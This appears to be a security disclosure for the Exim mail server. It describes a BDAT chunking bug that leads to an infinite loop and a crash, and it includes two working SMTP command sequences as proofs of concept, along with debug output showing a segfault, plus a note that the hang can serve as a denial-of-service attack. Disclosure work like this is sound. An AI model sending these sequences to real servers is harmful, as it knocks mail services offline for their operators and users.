@@ -1,0 +1,55 @@
+While parsing BDAT data header, exim still scans for '.' and consider it the end of mail.
+https://github.com/Exim/exim/blob/master/src/src/receive.c#L1867
+
+Exim goes into an incorrect state after this message is sent because the function pointer receive_getc is not reset. If the following command is also a BDAT, receive_getc and lwr_receive_getc become the same and an infinite loop occurs inside bdat_getc. Program crashes due to running out of stack.
+https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L547
+
+Here is a simple PoC which leads to an infinite loop and program crash:
+
+EHLO localhost
+MAIL FROM:<test@localhost>
+RCPT TO:<test@localhost>
+BDAT 10
+.
+BDAT 0
+
+
+Part of debug info
+============================
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30502 SMTP>> 250 0 byte chunk received
+15:36:54 30502 chunking state 0
+15:36:54 30295 child 30502 ended: status=0x8b
+15:36:54 30295   signal exit, signal 11 (core dumped)
+15:36:54 30295 1 SMTP accept process now running
+15:36:54 30295 Listening...
+============================
+
+We also found that this vulnerability can make exim hang(go into an infinite loop without crashing and run forever) even the connection is closed. It seems like this can be used to raise a resource based DoS attack.
+This can be triggered using the following command:
+
+EHLO localhost
+MAIL FROM:<test@localhost>
+RCPT TO:<test@localhost>
+BDAT 100
+.
+MAIL FROM:<test@localhost>
+RCPT TO:<test@localhost>
+BDAT 0 LAST
+
+// Tested on current master, ubuntu16.04.
